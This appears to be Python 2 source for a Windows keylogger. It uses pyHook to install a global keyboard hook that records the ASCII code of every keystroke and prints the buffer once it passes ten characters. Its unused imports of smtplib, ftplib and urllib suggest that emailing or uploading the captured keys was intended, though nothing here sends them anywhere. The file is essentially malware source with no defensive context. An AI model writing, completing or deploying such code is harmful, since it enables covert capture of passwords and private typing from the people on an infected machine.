import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import winerror, win32api, win32event
import pyHook
import pythoncom
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

data=''
count=0

def local():

    global data
    
    if len(data)>10:
        
        print data
        data = ''
    
    return True


def keypressed(event):

    global x, data

    key = event.Ascii

    data = data + " " + str(key)

    local()


def keyPressRecorder():

    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':

    keyPressRecorder()